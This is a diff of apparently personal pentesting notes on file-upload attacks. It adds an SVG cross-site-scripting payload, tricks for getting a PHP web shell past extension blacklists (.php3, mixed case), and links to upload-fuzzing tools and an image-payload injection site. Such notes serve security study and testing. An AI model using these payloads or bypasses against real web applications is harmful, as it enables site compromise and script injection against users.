@@ -1,6 +1,33 @@
 
+https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/maliciousimages   it contains the bad files .swf xxs
+
+tools 
+https://github.com/almandin/fuxploider          tools 
 
 File Uploads 
+
+
+xss through File Upload we can execute javascript code 
+through Svg lets Talk about svg svg uses the xml inside 
+
+payload == [
+
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/
+Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/
+svg">
+<script type="text/javascript">
+alert("XSS: "+document.domain);
+</script>
+</svg>
+
+
+
+]
+
+saved the file by name payload.svg and upload 
 
 in file Upload you have to upload shell in web app 
 
@@ -23,4 +50,33 @@ add Null Byte in filenam  -- shell.php           # not clear where
 
 BlackListing file-extension
 if .php in blacklisted use .php3
+developers sometime forget case insenstive  use PHP Php PHp pHP like this
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://www.thexifer.net/   #this site is use to inject the php payload to the image file staneography 
+
+
+
+
+
 
